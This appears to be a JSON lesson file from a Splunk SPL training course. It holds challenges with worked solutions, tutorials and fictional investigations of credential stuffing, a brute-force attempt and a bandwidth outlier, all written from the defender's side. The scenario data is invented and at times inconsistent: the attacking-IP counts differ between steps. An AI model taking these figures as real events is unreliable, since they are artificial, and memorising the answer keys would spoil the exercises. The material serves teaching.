          "conclusion": "<strong>Investigation Complete!</strong><br><br>\n                    <strong>Summary:</strong> Confirmed brute force attack against administrator accounts from an internal kiosk PC (10.45.23.99 / WKS-RECEPTION-02).<br><br>\n                    <strong>Impact:</strong> No successful compromise - all attempts failed.<br><br>\n                    <strong>Recommended Actions:</strong>\n                    <ol>\n                        <li>Isolate WKS-RECEPTION-02 from the network immediately</li>\n                        <li>Check the physical kiosk for unauthorized access or malware</li>\n                        <li>Review logs for how the attack was initiated (removable media? physical access?)</li>\n                        <li>Consider blocking authentication attempts from kiosk systems to admin accounts</li>\n                    </ol>"
        }
      },
      {
        "id": "found-004",
        "title": "Count Events",
        "type": "challenge",
        "difficulty": "beginner",
        "duration": "10 min",
        "objectives": [
          "Use the stats command",
          "Count events with grouping",
          "Understand count vs dc (distinct count)"
        ],
        "tags": [
          "basics",
          "aggregation",
          "stats"
        ],
        "description": "Practice the fundamental skill of counting and summarizing events.",
        "content": {
          "problem": "You need to analyze web server logs. Find the total number of requests per HTTP status code (200, 404, 500, etc.) from the web index.",
          "hints": [
            "The stats command is used for aggregation",
            "Use count to count events",
            "Use \"by\" to group by a field (status)"
          ],
          "solution": {
            "spl": "index=web | stats count by status",
            "explanation": "The stats command aggregates all events. \"count\" counts the number of events in each group. \"by status\" creates groups for each unique status code value."
          },
          "variations": [
            {
              "description": "Now count requests by status AND method (GET, POST, etc.):",
              "spl": "index=web | stats count by status, method"
            },
            {
              "description": "Count how many UNIQUE users got each status code:",
              "spl": "index=web | stats dc(user) as unique_users by status"
            }
          ]
        }
      },
      {
        "id": "found-005",
        "title": "Filter by Field Values",
        "type": "challenge",
        "difficulty": "beginner",
        "duration": "10 min",
        "objectives": [
          "Use the where command for filtering",
          "Apply comparison operators",
          "Combine multiple conditions"
        ],
        "tags": [
          "basics",
          "filtering",
          "where"
        ],
        "description": "Master the art of filtering events to find exactly what you need.",
        "content": {
          "problem": "Find all firewall events where `bytes_out` is greater than 1MB (1048576 bytes) AND the destination port is NOT 80 or 443.",
          "hints": [
            "Use the `where` command after retrieving events",
            "Greater than is just `>` in SPL",
            "`NOT IN` checks if value is not in a list"
          ],
          "solution": {
            "spl": "index=firewall | where bytes_out > 1048576 AND dest_port NOT IN (80, 443)",
            "explanation": "The where command evaluates each event. We check bytes_out exceeds 1MB AND the destination port is neither 80 (HTTP) nor 443 (HTTPS). This could indicate large data transfers over unusual ports."
          },
          "variations": [
            {
              "description": "Find events where bytes_out is more than 10x bytes_in (asymmetric traffic):",
              "spl": "index=firewall | where bytes_out > (bytes_in * 10)"
            },
            {
              "description": "Find connections lasting longer than 1 hour (3600 seconds):",
              "spl": "index=firewall | where duration > 3600"
            }
          ]
        }
      },
      {
        "id": "found-010",
        "title": "Formatting Results with Table and Fields",
        "type": "challenge",
        "difficulty": "beginner",
        "duration": "10 min",
        "objectives": [
          "Select specific fields for output",
          "Rename fields for clarity",
          "Remove unwanted fields and control display order"
        ],
        "tags": [
          "basics",
          "table",
          "fields",
          "output",
          "rename"
        ],
        "description": "Learn to present your search results clearly using table, fields, and rename.",
        "content": {
          "problem": "You've found suspicious VPN logins and need to create a clean report for your manager. Starting with VPN events, create a table showing: the time (formatted nicely), username, source country, source IP, and connection duration in minutes. Rename the columns to be human-readable.",
          "hints": [
            "Use | table to select and order specific fields",
            "Use | rename to change field names (rename old AS new)",
            "Use | eval to format time with strftime() and calculate duration",
            "The fields command can also remove unwanted fields with a minus sign"
          ],
          "solution": {
            "spl": "index=vpn action=connect\n| eval login_time = strftime(_time, \"%Y-%m-%d %H:%M\")\n| eval duration_min = round(duration / 60, 1)\n| table login_time, user, src_country, src_ip, duration_min\n| rename login_time AS \"Login Time\", user AS \"Username\", src_country AS \"Country\", src_ip AS \"Source IP\", duration_min AS \"Duration (min)\"",
            "explanation": "First, we format the timestamp and calculate duration in minutes using eval. Then table selects exactly which fields to show and in what order. Finally, rename gives each column a business-friendly name for the report."
          },
          "variations": [
            {
              "description": "Keep only specific fields and remove all others (for performance):",
              "spl": "index=firewall | fields src_ip, dest_ip, dest_port, action, bytes_out | head 100"
            },
            {
              "description": "Remove specific fields while keeping everything else:",
              "spl": "index=web | fields - _raw, _time, linecount, splunk_server | head 100"
            },
            {
              "description": "Rename multiple fields in one command:",
              "spl": "index=firewall | stats sum(bytes_in) as bytes_in, sum(bytes_out) as bytes_out by src_ip | rename bytes_in AS \"Bytes Received\", bytes_out AS \"Bytes Sent\", src_ip AS \"Source IP\""
            },
            {
              "description": "Combine sort, head, and table for a \"Top N\" report:",
              "spl": "index=web status>=400 | stats count as errors by uri_path, status | sort -errors | head 10 | rename uri_path AS \"URL Path\", errors AS \"Error Count\", status AS \"HTTP Status\""
            }
          ]
        }
      },
      {
        "id": "found-011",
        "title": "Where vs Search: Choosing the Right Filter",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "15 min",
        "objectives": [
          "Understand when to use search vs where",
          "Avoid common filtering mistakes",
          "Write efficient filters for each situation"
        ],
        "tags": [
          "basics",
          "where",
          "search",
          "filtering",
          "performance"
        ],
        "description": "Learn when to use the search command vs the where command - a common source of confusion.",
        "content": {
          "sections": [
            {
              "title": "Two Ways to Filter",
              "body": "<p>SPL has two main filtering commands:</p>\n                        <ul>\n                            <li><code>search</code> - Filter using search syntax (field=value, wildcards, AND/OR/NOT)</li>\n                            <li><code>where</code> - Filter using eval expressions (comparisons, functions)</li>\n                        </ul>\n                        <p>They often give the same results, but they work differently and have different strengths.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Use search For: Simple Matching",
              "body": "<p>The <code>search</code> command excels at:</p>\n                        <ul>\n                            <li>Field=value matching</li>\n                            <li>Wildcard patterns</li>\n                            <li>Case-insensitive text</li>\n                            <li>Boolean logic (AND, OR, NOT)</li>\n                        </ul>",
              "spl": "index=web status=404 uri_path=\"/api/*\" NOT host=test*",
              "explanation": "Simple field matching with wildcards - search handles this naturally."
            },
            {
              "title": "Use where For: Comparisons and Functions",
              "body": "<p>The <code>where</code> command excels at:</p>\n                        <ul>\n                            <li>Numeric comparisons (>, <, >=, !=)</li>\n                            <li>Calculations and expressions</li>\n                            <li>Function calls (isnull, like, match, cidrmatch)</li>\n                            <li>Case-sensitive matching</li>\n                        </ul>",
              "spl": "index=firewall | where bytes > 1000000 AND duration < 60",
              "explanation": "Numeric comparisons require where - search can't do greater-than."
            },
            {
              "title": "Key Difference: Case Sensitivity",
              "body": "<p>This trips up many analysts:</p>\n                        <ul>\n                            <li><code>search</code> is <strong>case-insensitive</strong> by default</li>\n                            <li><code>where</code> is <strong>case-sensitive</strong></li>\n                        </ul>",
              "spl": "| makeresults | eval user=\"Admin\"\n| search user=admin\n| where user=\"admin\"",
              "explanation": "search finds \"Admin\" with user=admin. where does NOT find \"Admin\" with user=\"admin\" - cases must match!"
            },
            {
              "title": "Key Difference: Null Handling",
              "body": "<p>When a field doesn't exist:</p>\n                        <ul>\n                            <li><code>search field=*</code> - Finds events where field exists</li>\n                            <li><code>where isnotnull(field)</code> - Same result, explicit null check</li>\n                            <li><code>where field=\"value\"</code> - Silently excludes nulls</li>\n                        </ul>",
              "spl": "index=auth | where isnull(error_code) | stats count",
              "explanation": "Use isnull()/isnotnull() in where to explicitly check for missing fields."
            },
            {
              "title": "Key Difference: Wildcards",
              "body": "<p>Pattern matching syntax differs:</p>\n                        <ul>\n                            <li><code>search</code> uses <code>*</code> for wildcards: <code>user=admin*</code></li>\n                            <li><code>where</code> uses <code>like()</code> with <code>%</code>: <code>like(user, \"admin%\")</code></li>\n                            <li><code>where</code> also supports <code>match()</code> for regex</li>\n                        </ul>",
              "spl": "... | where like(uri_path, \"/api/v%/users/%\") OR match(user, \"^svc_.*\")",
              "explanation": "where uses SQL-style % wildcards with like() and full regex with match()."
            },
            {
              "title": "Performance Tip",
              "body": "<p>When filtering at the <strong>start</strong> of a search, use search syntax in the initial query - it's optimized at the indexer level:</p>",
              "spl": "index=web status>=400 host=prod* earliest=-1h\n| where response_time > 5000",
              "explanation": "Put index, sourcetype, and simple field matches early. Use where for numeric comparisons on extracted fields."
            },
            {
              "title": "Quick Reference",
              "body": "<table style=\"width:100%; border-collapse: collapse; margin: 10px 0;\">\n                            <tr style=\"background: rgba(255,255,255,0.1);\"><td style=\"padding:8px; border:1px solid #444;\"><strong>Need</strong></td><td style=\"padding:8px; border:1px solid #444;\"><strong>Use</strong></td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">field=value (exact match)</td><td style=\"padding:8px; border:1px solid #444;\">search</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Wildcards (user=admin*)</td><td style=\"padding:8px; border:1px solid #444;\">search</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Case-insensitive matching</td><td style=\"padding:8px; border:1px solid #444;\">search</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Numeric comparison (>100)</td><td style=\"padding:8px; border:1px solid #444;\">where</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Function calls (cidrmatch, len)</td><td style=\"padding:8px; border:1px solid #444;\">where</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Check for null</td><td style=\"padding:8px; border:1px solid #444;\">where isnull()</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Regex patterns</td><td style=\"padding:8px; border:1px solid #444;\">where match()</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">Calculated conditions</td><td style=\"padding:8px; border:1px solid #444;\">where (bytes/1024 > 100)</td></tr>\n                        </table>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "found-012",
        "title": "Time Bucketing and Trends",
        "type": "challenge",
        "difficulty": "beginner",
        "duration": "15 min",
        "objectives": [
          "Use bin to group events into time buckets",
          "Create trend analysis with timechart",
          "Compare time periods effectively"
        ],
        "tags": [
          "basics",
          "timechart",
          "bin",
          "trends",
          "time"
        ],
        "description": "Learn to analyze trends over time using bin and timechart.",
        "content": {
          "problem": "Your manager asks: \"Are we getting more errors this week compared to last week?\" Using web server logs, create a visualization that shows error counts (status >= 400) by hour, so you can compare patterns between the two weeks.",
          "hints": [
            "Use timechart with span=1h to bucket by hour",
            "timechart count creates a count over time",
            "The earliest and latest modifiers control your time range",
            "You can also use bin _time span=1h with stats for more control"
          ],
          "solution": {
            "spl": "index=web status>=400 earliest=-14d\n| timechart span=1h count as errors",
            "explanation": "timechart automatically buckets by time (span=1h) and counts events. The result shows errors per hour over 14 days, making weekly patterns visible."
          },
          "variations": [
            {
              "description": "Compare current hour to same hour yesterday:",
              "spl": "index=web status>=400 earliest=-1h\n| stats count as current_hour\n| appendcols [search index=web status>=400 earliest=-25h latest=-24h | stats count as yesterday_same_hour]\n| eval change_pct = round(((current_hour - yesterday_same_hour) / yesterday_same_hour) * 100, 1)"
            },
            {
              "description": "Break down errors by type over time:",
              "spl": "index=web status>=400 | timechart span=1h count by status"
            },
            {
              "description": "Use bin for more control over grouping:",
              "spl": "index=web status>=400 | bin _time span=1h | stats count, dc(src_ip) as unique_ips by _time | where count > 100"
            },
            {
              "description": "See hourly pattern by day of week:",
              "spl": "index=web status>=400 | eval hour=strftime(_time,\"%H\"), dow=strftime(_time,\"%A\") | stats count by dow, hour | sort dow, hour"
            }
          ]
        }
      }
    ],
    "coreSkills": [
      {
        "id": "core-001",
        "title": "Mastering Stats",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Use multiple aggregation functions",
          "Combine stats with filtering",
          "Create calculated fields in stats"
        ],
        "tags": [
          "stats",
          "aggregation",
          "analysis"
        ],
        "description": "Deep dive into the stats command - the workhorse of SPL analysis.",
        "content": {
          "sections": [
            {
              "title": "Aggregation Functions",
              "body": "<p>Stats supports many aggregation functions:</p>\n                        <ul>\n                            <li><code>count</code> - Number of events</li>\n                            <li><code>dc(field)</code> - Distinct count of values</li>\n                            <li><code>sum(field)</code> - Sum of numeric field</li>\n                            <li><code>avg(field)</code> - Average value</li>\n                            <li><code>min(field)</code> / <code>max(field)</code> - Extremes</li>\n                            <li><code>values(field)</code> - List of all values</li>\n                            <li><code>first(field)</code> / <code>last(field)</code> - First/last value</li>\n                        </ul>",
              "spl": "index=web | stats count, dc(user) as unique_users, avg(response_time) as avg_ms by uri_path",
              "explanation": "Multiple aggregations on web logs: request count, unique users, and average response time per URL path."
            },
            {
              "title": "Stats with Expressions",
              "body": "<p>You can use expressions in stats:</p>",
              "spl": "index=firewall | stats sum(bytes_in) as total_in, sum(bytes_out) as total_out, sum(eval(bytes_in + bytes_out)) as total_bytes by src_ip",
              "explanation": "Calculate total inbound, outbound, and combined bytes using eval inside stats."
            },
            {
              "title": "Percentiles",
              "body": "<p>Use percentiles to understand distributions:</p>",
              "spl": "index=web | stats count, avg(response_time) as avg, perc50(response_time) as median, perc95(response_time) as p95, perc99(response_time) as p99 by uri_path | where count > 100",
              "explanation": "See not just averages but distribution - p95 and p99 reveal outliers that averages hide."
            },
            {
              "title": "Time-Based Stats",
              "body": "<p>Use earliest() and latest() to capture time ranges:</p>",
              "spl": "index=vpn action=* | stats earliest(_time) as first_seen, latest(_time) as last_seen, values(action) as actions, dc(src_ip) as locations by user | eval duration=last_seen-first_seen",
              "explanation": "Track each VPN user's session: when they started, ended, what actions they took, and from how many IPs."
            }
          ]
        }
      },
      {
        "id": "core-002",
        "title": "Brute Force Detection",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Detect credential stuffing patterns",
          "Identify distributed attacks",
          "Calculate attack velocity"
        ],
        "tags": [
          "authentication",
          "security",
          "brute-force"
        ],
        "description": "Investigate a suspected credential stuffing attack against your web application.",
        "content": {
          "situation": "The web application team reports slow response times. Initial checks show the authentication endpoint is receiving unusual traffic. You suspect credential stuffing - attackers trying stolen username/password combinations.",
          "steps": [
            {
              "question": "First, let's examine authentication endpoint traffic. What does the failure rate look like?",
              "hint": "Look at the /api/login endpoint and calculate success vs failure percentages.",
              "spl": "index=web uri_path=\"/api/login\" | stats count as total, count(eval(status=200)) as success, count(eval(status=401)) as failure | eval failure_rate=round((failure/total)*100, 2)",
              "analysis": "This calculates the overall success/failure ratio for login attempts.",
              "output": {
                "columns": [
                  "total",
                  "success",
                  "failure",
                  "failure_rate"
                ],
                "rows": [
                  {
                    "total": "50247",
                    "success": "3014",
                    "failure": "47233",
                    "failure_rate": "94.00"
                  }
                ]
              },
              "finding": "Alarming: 94% failure rate on login attempts (47,000 failures out of 50,000 attempts in the last hour). Normal is ~5%."
            },
            {
              "question": "That's a clear attack. Is it coming from one source or distributed?",
              "hint": "Count failures by source IP to see the distribution.",
              "spl": "index=web uri_path=\"/api/login\" status=401 | stats count by src_ip | sort -count | head 20",
              "analysis": "Shows how failures are distributed across source IPs.",
              "output": {
                "columns": [
                  "src_ip",
                  "count"
                ],
                "rows": [
                  {
                    "src_ip": "198.51.100.47",
                    "count": "487"
                  },
                  {
                    "src_ip": "203.0.113.22",
                    "count": "456"
                  },
                  {
                    "src_ip": "192.0.2.88",
                    "count": "421"
                  },
                  {
                    "src_ip": "198.51.100.103",
                    "count": "398"
                  },
                  {
                    "src_ip": "203.0.113.156",
                    "count": "367"
                  }
                ],
                "truncated": "Showing 5 of 20 results"
              },
              "finding": "Distributed attack: Top 20 IPs each have 200-500 failures. No single IP dominates - this is coordinated."
            },
            {
              "question": "Let's understand the attack pattern. Are they trying many passwords per user, or one password per many users?",
              "hint": "Compare unique usernames to unique passwords per source IP.",
              "spl": "index=web uri_path=\"/api/login\" status=401 | stats dc(username) as unique_users, dc(password) as unique_passwords, count as attempts by src_ip | where attempts > 50 | eval ratio=round(unique_users/unique_passwords, 2)",
              "analysis": "This reveals the attack strategy - credential stuffing typically has high user:password ratios.",
              "output": {
                "columns": [
                  "src_ip",
                  "unique_users",
                  "unique_passwords",
                  "attempts",
                  "ratio"
                ],
                "rows": [
                  {
                    "src_ip": "198.51.100.47",
                    "unique_users": "487",
                    "unique_passwords": "10",
                    "attempts": "487",
                    "ratio": "48.70"
                  },
                  {
                    "src_ip": "203.0.113.22",
                    "unique_users": "456",
                    "unique_passwords": "9",
                    "attempts": "456",
                    "ratio": "50.67"
                  },
                  {
                    "src_ip": "192.0.2.88",
                    "unique_users": "421",
                    "unique_passwords": "8",
                    "attempts": "421",
                    "ratio": "52.63"
                  }
                ],
                "truncated": "Showing 3 of 47 attacking IPs"
              },
              "finding": "Credential stuffing confirmed: ratio of ~50 unique users per password. They're trying known passwords across many accounts."
            },
            {
              "question": "Which user accounts are being targeted most heavily? Are any high-value accounts at risk?",
              "hint": "Count attempts by username and look for patterns.",
              "spl": "index=web uri_path=\"/api/login\" status=401 | stats count by username | sort -count | head 30",
              "analysis": "Shows which accounts are receiving the most attempts.",
              "output": {
                "columns": [
                  "username",
                  "count"
                ],
                "rows": [
                  {
                    "username": "admin",
                    "count": "847"
                  },
                  {
                    "username": "administrator",
                    "count": "823"
                  },
                  {
                    "username": "jsmith@company.com",
                    "count": "156"
                  },
                  {
                    "username": "mwilson@company.com",
                    "count": "142"
                  },
                  {
                    "username": "demo@company.com",
                    "count": "134"
                  },
                  {
                    "username": "test",
                    "count": "98"
                  }
                ],
                "truncated": "Showing 6 of 30 results"
              },
              "finding": "Top targets include: admin, administrator, test, demo, and several real employee email addresses. The attackers have some internal knowledge."
            },
            {
              "question": "Critical check - have any of these attacks succeeded? Look for successful logins from attacking IPs.",
              "hint": "Cross-reference attacking IPs with successful authentication events.",
              "spl": "index=web uri_path=\"/api/login\" status=401 | stats dc(username) as attempts by src_ip | where attempts > 50 | fields src_ip | map search=\"search index=web uri_path=\\\"/api/login\\\" status=200 src_ip=$src_ip$ | stats count by username, src_ip\"",
              "analysis": "Check if any attacking IPs achieved successful logins.",
              "output": {
                "columns": [
                  "username",
                  "src_ip",
                  "count"
                ],
                "rows": [
                  {
                    "username": "jsmith@company.com",
                    "src_ip": "198.51.100.47",
                    "count": "1"
                  },
                  {
                    "username": "mwilson@company.com",
                    "src_ip": "203.0.113.22",
                    "count": "1"
                  },
                  {
                    "username": "demo@company.com",
                    "src_ip": "192.0.2.88",
                    "count": "1"
                  }
                ]
              },
              "finding": "CRITICAL: 3 successful logins from attacking IPs! Users jsmith@company.com, mwilson@company.com, and demo@company.com were compromised."
            }
          ],
          "conclusion": "<strong>Investigation Complete!</strong><br><br>\n                    <strong>Attack Type:</strong> Distributed credential stuffing attack from 200+ IPs<br><br>\n                    <strong>Impact:</strong> 3 accounts compromised (jsmith, mwilson, demo)<br><br>\n                    <strong>Immediate Actions:</strong>\n                    <ol>\n                        <li>Force password reset for compromised accounts</li>\n                        <li>Revoke all active sessions for those users</li>\n                        <li>Block attacking IP ranges at WAF</li>\n                        <li>Enable rate limiting on /api/login endpoint</li>\n                        <li>Review compromised accounts for any malicious activity post-login</li>\n                    </ol>"
        }
      },
      {
        "id": "core-003",
        "title": "Find the Outlier",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "20 min",
        "objectives": [
          "Establish traffic baselines",
          "Identify statistical anomalies",
          "Investigate unusual patterns"
        ],
        "tags": [
          "network",
          "anomaly",
          "statistics"
        ],
        "description": "A user reports slow internet - find the bandwidth hog hiding in network traffic.",
        "content": {
          "situation": "Users in the Finance department report \"the internet is slow today.\" Network team confirms the 1Gbps uplink to their floor is saturated. You need to find what's consuming all the bandwidth.",
          "steps": [
            {
              "question": "First, confirm the issue. What's the current bandwidth usage from the Finance subnet?",
              "hint": "Sum up bytes transferred over time from the Finance IP range.",
              "spl": "index=firewall src_ip=\"10.20.30.*\" | timechart span=5m sum(bytes_out) as bytes_out | eval MB=round(bytes_out/1024/1024, 2)",
              "analysis": "Shows outbound traffic from Finance in 5-minute windows.",
              "output": {
                "columns": [
                  "_time",
                  "bytes_out",
                  "MB"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 09:00",
                    "bytes_out": "52428800",
                    "MB": "50.00"
                  },
                  {
                    "_time": "2024-01-15 09:05",
                    "bytes_out": "838860800",
                    "MB": "800.00"
                  },
                  {
                    "_time": "2024-01-15 09:10",
                    "bytes_out": "891289600",
                    "MB": "850.00"
                  },
                  {
                    "_time": "2024-01-15 09:15",
                    "bytes_out": "943718400",
                    "MB": "900.00"
                  },
                  {
                    "_time": "2024-01-15 09:20",
                    "bytes_out": "864026624",
                    "MB": "824.00"
                  }
                ],
                "truncated": "Showing 5 of 48 time buckets"
              },
              "finding": "Confirmed: Sustained 800+ MB per 5 minutes (roughly 20 Mbps average, with spikes to 50+ Mbps). Normal baseline is ~5 Mbps."
            },
            {
              "question": "Which specific IP in Finance is responsible for most of this traffic?",
              "hint": "Aggregate bytes by source IP and find the top consumers.",
              "spl": "index=firewall src_ip=\"10.20.30.*\" | stats sum(bytes_out) as total_bytes by src_ip | sort -total_bytes | eval GB=round(total_bytes/1024/1024/1024, 2) | head 10",
              "analysis": "Ranks Finance IPs by total outbound traffic.",
              "output": {
                "columns": [
                  "src_ip",
                  "total_bytes",
                  "GB"
                ],
                "rows": [
                  {
                    "src_ip": "10.20.30.47",
                    "total_bytes": "48318382080",
                    "GB": "45.00"
                  },
                  {
                    "src_ip": "10.20.30.15",
                    "total_bytes": "2147483648",
                    "GB": "2.00"
                  },
                  {
                    "src_ip": "10.20.30.88",
                    "total_bytes": "1610612736",
                    "GB": "1.50"
                  },
                  {
                    "src_ip": "10.20.30.22",
                    "total_bytes": "1073741824",
                    "GB": "1.00"
                  }
                ],
                "truncated": "Showing 4 of 10 results"
              },
              "finding": "Single outlier: 10.20.30.47 has transferred 45GB outbound today. Next highest is 2GB. This IP is the problem."
            },
            {
              "question": "Where is 10.20.30.47 sending all this data?",
              "hint": "Look at destination IPs and ports for this source.",
              "spl": "index=firewall src_ip=\"10.20.30.47\" | stats sum(bytes_out) as bytes, dc(dest_port) as ports by dest_ip | sort -bytes | eval GB=round(bytes/1024/1024/1024, 2) | head 10",
              "analysis": "Shows where the traffic is going.",
              "output": {
                "columns": [
                  "dest_ip",
                  "bytes",
                  "ports",
                  "GB"
                ],
                "rows": [
                  {
                    "dest_ip": "185.199.108.133",
                    "bytes": "21474836480",
                    "ports": "1",
                    "GB": "20.00"
                  },
                  {
                    "dest_ip": "185.199.109.133",
                    "bytes": "16106127360",
                    "ports": "1",
                    "GB": "15.00"
                  },
                  {
                    "dest_ip": "185.199.110.133",
                    "bytes": "5368709120",
                    "ports": "1",
                    "GB": "5.00"
                  },
                  {
                    "dest_ip": "10.1.1.50",
                    "bytes": "1073741824",
                    "ports": "3",
                    "GB": "1.00"
                  }
                ],
                "truncated": "Showing 4 of 10 results"
              },
              "finding": "Bulk of traffic (40GB+) going to 185.199.x.x range - this is a cloud storage provider. Single port 443 suggests HTTPS uploads."
            },
            {
              "question": "What asset is this? Who owns it?",
              "hint": "Cross-reference with asset inventory.",
              "spl": "index=asset_inventory ip=\"10.20.30.47\" | table hostname, department, owner, asset_type",
              "analysis": "Identify the device and owner.",
              "output": {
                "columns": [
                  "hostname",
                  "department",
                  "owner",
                  "asset_type"
                ],
                "rows": [
                  {
                    "hostname": "FIN-WKS-JONES",
                    "department": "Finance",
                    "owner": "Patricia Jones",
                    "asset_type": "Desktop PC"
                  }
                ]
              },
              "finding": "Asset: FIN-WKS-JONES (workstation), Owner: Patricia Jones, Department: Finance, Asset Type: Desktop PC"
            },
            {
              "question": "Is this a data exfiltration attempt? Check what type of application is making these connections.",
              "hint": "Look at connection patterns - user agent, app signatures, or process info if available.",
              "spl": "index=firewall src_ip=\"10.20.30.47\" dest_ip=\"185.199.*\" | stats count, sum(bytes_out) as bytes by app_category, app_name | sort -bytes",
              "analysis": "Identify the application responsible.",
              "output": {
                "columns": [
                  "app_category",
                  "app_name",
                  "count",
                  "bytes"
                ],
                "rows": [
                  {
                    "app_category": "cloud-storage",
                    "app_name": "Dropbox",
                    "count": "4827",
                    "bytes": "42949672960"
                  },
                  {
                    "app_category": "web-browsing",
                    "app_name": "Chrome",
                    "count": "156",
                    "bytes": "52428800"
                  }
                ]
              },
              "finding": "Application identified: \"Dropbox\" - 40GB uploaded. This is likely an authorized backup or sync, not exfiltration. But the volume is excessive."
            }
          ],
          "conclusion": "<strong>Investigation Complete!</strong><br><br>\n                    <strong>Root Cause:</strong> Patricia Jones (Finance) has Dropbox syncing 40GB+ of data, saturating department bandwidth.<br><br>\n                    <strong>Assessment:</strong> Not malicious, but policy violation (personal cloud storage) causing operational impact.<br><br>\n                    <strong>Recommended Actions:</strong>\n                    <ol>\n                        <li>Contact Patricia Jones - understand what's being synced</li>\n                        <li>Apply QoS policy to limit cloud storage bandwidth</li>\n                        <li>Review DLP policy compliance for synced content</li>\n                        <li>Consider department-wide cloud storage policy</li>\n                    </ol>"
        }
      },
      {
        "id": "core-004",
        "title": "Top N Analysis",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "10 min",
        "objectives": [
          "Combine stats with sorting",
          "Calculate percentages",
          "Create meaningful rankings"
        ],
        "tags": [
          "aggregation",
          "ranking",
          "analysis"
        ],
        "description": "Find the most significant items in large datasets.",
        "content": {
          "problem": "Find the top 10 source IPs by total bytes transferred in firewall logs. Include the percentage of total traffic each IP represents.",
          "hints": [
            "First calculate total bytes per IP with stats",
            "Use eventstats to get the overall total",
            "Calculate percentage and sort"
          ],
          "solution": {
            "spl": "index=firewall | stats sum(bytes_out) as bytes by src_ip | eventstats sum(bytes) as total_bytes | eval percentage=round((bytes/total_bytes)*100, 2) | sort -bytes | head 10 | table src_ip, bytes, percentage",
            "explanation": "We first aggregate bytes per IP, then use eventstats to add the grand total to each row (without collapsing), calculate percentage, sort descending, and take top 10."
          },
          "variations": [
            {
              "description": "Find top 10 destination countries by request count with percentage:",
              "spl": "index=firewall | stats count by dest_country | eventstats sum(count) as total | eval pct=round((count/total)*100, 2) | sort -count | head 10"
            },
            {
              "description": "Find top 10 URLs by error rate (only URLs with 100+ requests):",
              "spl": "index=web | stats count as total, count(eval(status>=400)) as errors by uri_path | where total >= 100 | eval error_rate=round((errors/total)*100, 2) | sort -error_rate | head 10"
            }
          ]
        }
      },
      {
        "id": "core-005",
        "title": "Multi-Field Grouping",
        "type": "challenge",
        "difficulty": "intermediate",
        "duration": "15 min",
        "objectives": [
          "Group by multiple dimensions",
          "Analyze patterns across categories",
          "Identify unusual combinations"
        ],
        "tags": [
          "stats",
          "analysis",
          "patterns"
        ],
        "description": "Learn to analyze data across multiple dimensions simultaneously.",
        "content": {
          "problem": "From Windows security logs, find all unique combinations of user, source workstation, and logon type. Show the count for each combination and identify any user logging in from more than 3 different workstations.",
          "hints": [
            "Group by multiple fields with stats count by field1, field2, field3",
            "Then use stats again to count workstations per user",
            "Filter to users with 3+ workstations"
          ],
          "solution": {
            "spl": "index=wineventlog EventCode=4624 | stats count by TargetUserName, WorkstationName, LogonType | stats dc(WorkstationName) as unique_workstations, values(WorkstationName) as workstations, sum(count) as total_logins by TargetUserName | where unique_workstations > 3 | sort -unique_workstations",
            "explanation": "First grouping gets each unique combination with counts. Second grouping collapses by user, counting distinct workstations and preserving the list. Filter to users with anomalous behavior (3+ workstations)."
          },
          "variations": [
            {
              "description": "Find users who authenticated from more than 2 countries in a day:",
              "spl": "index=vpn | stats dc(src_country) as countries, values(src_country) as country_list by user | where countries > 2"
            },
            {
              "description": "Find source IPs that connected to more than 50 unique destination IPs (potential scanning):",
              "spl": "index=firewall | stats dc(dest_ip) as unique_dests, dc(dest_port) as unique_ports by src_ip | where unique_dests > 50 | sort -unique_dests"
            }
          ]
        }
      }
    ],
    "intermediate": [
      {
        "id": "int-001",
        "title": "Subsearch Strategies",
        "type": "tutorial",
        "difficulty": "intermediate",
        "duration": "25 min",
        "objectives": [
          "Understand when to use subsearches",
          "Master subsearch syntax",
          "Avoid common performance pitfalls"
        ],
        "tags": [
          "subsearch",
          "correlation",
          "performance"
        ],
        "description": "Learn when and how to use subsearches effectively without destroying performance.",
        "content": {
          "sections": [
            {
              "title": "What is a Subsearch?",
              "body": "<p>A subsearch runs first, returns results, and those results become part of the main search. They're enclosed in square brackets <code>[]</code>.</p>\n                        <p>Think of it as: \"Find X, then use X to find Y.\"</p>",
              "spl": "index=web [search index=security action=blocked | fields src_ip] | stats count by src_ip, uri_path",
              "explanation": "Find IPs that were blocked in security logs, then find their web activity."
            },
            {
              "title": "Subsearch Returns Values",
              "body": "<p>By default, subsearch returns results as OR conditions:</p>\n                        <pre>(src_ip=\"1.2.3.4\") OR (src_ip=\"5.6.7.8\")</pre>\n                        <p>Use <code>format</code> to control output format. Use <code>return</code> for single values.</p>",
              "spl": "index=web status=500 | stats count by src_ip | head 1 | return src_ip",
              "explanation": "Returns just the IP with the most 500 errors as a single value."
            },
            {
              "title": "Performance Considerations",
              "body": "<p><strong>Warning:</strong> Subsearches have limits!</p>\n                        <ul>\n                            <li>Max ~10,000 results (default)</li>\n                            <li>Max 60 seconds runtime (default)</li>\n                            <li>Results are expanded inline - huge subsearches = huge queries</li>\n                        </ul>\n                        <p>For large correlations, use <code>join</code> or <code>lookup</code> instead.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Common Patterns",
              "body": "<p><strong>Pattern 1:</strong> Find events related to flagged items</p>",
              "spl": "index=web [search index=threats indicator_type=ip | fields indicator_value | rename indicator_value as src_ip]",
              "explanation": "Find web traffic from IPs in your threat intelligence."
            }
          ]
        }
      },
      {
        "id": "int-002",
        "title": "Lateral Movement Hunt",
        "type": "scenario",
        "difficulty": "intermediate",
        "duration": "30 min",
        "objectives": [
          "Trace authentication chains",
          "Identify credential hopping",
          "Map attack paths"
        ],
        "tags": [
          "authentication",
          "windows",
          "threat-hunting",
